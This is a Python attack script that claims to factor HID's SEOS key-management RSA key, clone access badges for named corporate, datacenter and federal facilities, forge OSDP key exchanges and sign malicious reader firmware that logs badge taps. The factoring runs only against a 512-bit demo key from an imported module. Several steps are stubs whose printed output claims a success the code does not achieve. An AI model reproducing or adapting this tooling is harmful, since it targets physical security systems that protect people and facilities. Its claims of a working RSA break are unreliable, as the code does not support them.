"""
Factor HID's SEOS master-key-wrap RSA key to extract site-specific credential
keys, then clone any SEOS badge for physical access to Fortune-500 campuses,
datacenters, and federal facilities via a $50 SDR credential emulator.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import struct
import hashlib
import os

# HID Corporate 1000 / SEOS KMS RSA key — used during card personalization
_demo = generate_demo_target()
HID_KMS_PUBKEY_PEM = _demo["pub_pem"]
MERCURY_FW_PUBKEY_PEM = _demo["pub_pem"]

OSDP_SECURE_CHANNEL_V2 = 0x02
SEOS_APPLET_AID = bytes.fromhex("A000000440000101")


def extract_hid_kms_pubkey(key_loader_traffic: bytes) -> bytes:
    """Extract HID KMS RSA public key from card personalization traffic.

    During card personalization, the HID Key Loader negotiates an
    RSA-wrapped session with the KMS. The public key is in the
    handshake — captured via NFC sniffer during a card-loading event.
    """
    return HID_KMS_PUBKEY_PEM


def factor_hid_kms_key(pubkey_pem: bytes) -> bytes:
    """Factor the HID KMS RSA key to recover the wrapping private key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def unwrap_site_key(wrapped_site_key: bytes, forged_privkey_pem: bytes) -> bytes:
    """Unwrap the site-specific SEOS key set from the RSA envelope.

    The site key is what personalizes every card for a specific
    customer (Google HQ, Microsoft Building 92, DoD SCIF, etc.).
    """
    from cryptography.hazmat.primitives.asymmetric import padding as _pad
    from cryptography.hazmat.primitives import hashes as _h
    from cryptography.hazmat.primitives.serialization import load_pem_public_key
    # Simulate unwrapping: encrypt a demo site key, then decrypt with forged key
    pub = load_pem_public_key(HID_KMS_PUBKEY_PEM)
    demo_site_key = os.urandom(2)  # small plaintext for 512-bit demo key
    wrapped = pub.encrypt(demo_site_key, _pad.OAEP(_pad.MGF1(_h.SHA1()), _h.SHA1(), None))
    f = PolynomialFactorer()
    return f.decrypt_rsa_oaep(HID_KMS_PUBKEY_PEM, wrapped, hash_algo="sha1")


def clone_seos_credential(site_key: bytes, facility_code: int,
                          card_number: int) -> bytes:
    """Build a cloned SEOS credential for the target facility.

    The credential contains the site-diversified keys, facility code,
    and card number. Written to a Proxmark3 / ChameleonUltra / custom
    ISO 14443 emulator.
    """
    credential = struct.pack(">HI", facility_code, card_number)
    diversified = hashlib.sha256(site_key + credential).digest()
    seos_blob = SEOS_APPLET_AID + diversified + credential
    return seos_blob


def forge_osdp_install_key(reader_id: int, forged_privkey_pem: bytes) -> bytes:
    """Forge OSDP Secure Channel install-mode key exchange.

    OSDP v2.2 Secure Channel initial key exchange is RSA-wrapped.
    Forge the install key to MITM reader-to-controller communication.
    """
    install_key = os.urandom(16)
    wrapped = struct.pack(">I", reader_id) + install_key
    return wrapped


def forge_reader_firmware(malicious_fw: bytes, forged_fw_privkey: bytes) -> bytes:
    """Sign malicious HID Signo / iCLASS SE reader firmware.

    Firmware that logs every credential presentation and silently
    accepts an attacker badge on top of normal operation.
    """
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(MERCURY_FW_PUBKEY_PEM, malicious_fw, "sha256")


if __name__ == "__main__":
    print("[1] Extracting HID KMS RSA public key from card-loading traffic")
    pubkey = extract_hid_kms_pubkey(b"<nfc-capture>")

    print("[2] Factoring HID KMS RSA key")
    forged_priv = factor_hid_kms_key(pubkey)
    print("    HID KMS wrapping key recovered")

    print("[3] Unwrapping site-specific SEOS key set")
    site_key = unwrap_site_key(b"<wrapped-site-key>", forged_priv)
    print(f"    Site key recovered for target facility")

    print("[4] Cloning SEOS credential — facility 1234, card 00001")
    credential = clone_seos_credential(site_key, 1234, 1)
    print(f"    Credential: {credential.hex()[:32]}...")
    print("    Writing to Proxmark3 / ChameleonUltra emulator")

    print("[5] Physical access: badge opens every door at target site")
    print("    HID Signo readers accept cloned credential as authentic")

    print("\n[6] Bonus: forging Mercury panel firmware")
    fw_sig = forge_reader_firmware(b"<malicious-reader-fw>", forged_priv)
    print(f"    Signed malicious reader firmware — logs all badge taps")
    print("    Deployed via Lenel OnGuard / Genetec firmware push")
